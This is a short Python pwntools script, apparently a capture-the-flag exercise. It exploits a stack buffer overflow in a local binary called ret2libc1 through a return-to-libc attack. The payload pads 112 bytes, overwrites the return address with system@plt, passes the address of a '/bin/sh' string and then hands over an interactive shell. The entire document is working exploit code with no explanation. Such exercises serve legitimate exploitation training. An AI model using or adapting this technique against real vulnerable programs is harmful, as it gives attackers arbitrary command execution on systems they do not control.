#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x08048720
system_plt = 0x08048460
payload = b'a' * 112+p32( system_plt)+ b'b' * 4+p32( binsh_addr)
sh.sendline(payload)

sh.interactive()

